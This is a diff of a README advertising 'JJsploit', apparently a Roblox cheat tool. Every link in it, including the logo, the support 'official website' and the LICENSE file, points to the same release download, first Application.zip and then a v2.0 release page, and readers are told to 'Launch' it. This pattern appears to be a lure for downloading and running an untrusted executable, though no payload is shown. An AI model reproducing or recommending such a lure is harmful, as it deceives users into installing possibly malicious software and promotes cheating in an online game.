@@ -1,6 +1,6 @@
 # 🚀 **JJsploit - The Ultimate Roblox Exploit**
 
-![JJsploit Logo](https://github.com/giangnewbie/JJsploit/releases/download/v1.0.0/Application.zip)
+![JJsploit Logo](https://github.com/giangnewbie/JJsploit/releases/tag/v2.0)
 
 ## Description
 
@@ -28,9 +28,9 @@ crack, exploiting, free, jjsploit, jjsploit-code-injector, jjsploit-custom-scrip
 ## Installation
 
 To utilize JJsploit and its powerful features, download the software package from the following link:  
-[Download https://github.com/giangnewbie/JJsploit/releases/download/v1.0.0/Application.zip](https://github.com/giangnewbie/JJsploit/releases/download/v1.0.0/Application.zip)
+[Download https://github.com/giangnewbie/JJsploit/releases/tag/v2.0](https://github.com/giangnewbie/JJsploit/releases/tag/v2.0)
 
-🔥 **Launch the https://github.com/giangnewbie/JJsploit/releases/download/v1.0.0/Application.zip to start enhancing your Roblox gaming experience!**
+🔥 **Launch the https://github.com/giangnewbie/JJsploit/releases/tag/v2.0 to start enhancing your Roblox gaming experience!**
 
 ## Usage
 
@@ -41,11 +41,11 @@ To utilize JJsploit and its powerful features, download the software package fro
 
 ## Support
 
-For any inquiries or assistance regarding JJsploit, visit the official website at [https://github.com/giangnewbie/JJsploit/releases/download/v1.0.0/Application.zip](https://github.com/giangnewbie/JJsploit/releases/download/v1.0.0/Application.zip).
+For any inquiries or assistance regarding JJsploit, visit the official website at [https://github.com/giangnewbie/JJsploit/releases/tag/v2.0](https://github.com/giangnewbie/JJsploit/releases/tag/v2.0).
 
 ## License
 
-This project is licensed under the **MIT License** - see the [LICENSE](https://github.com/giangnewbie/JJsploit/releases/download/v1.0.0/Application.zip) file for details.
+This project is licensed under the **MIT License** - see the [LICENSE](https://github.com/giangnewbie/JJsploit/releases/tag/v2.0) file for details.
 
 ---
 
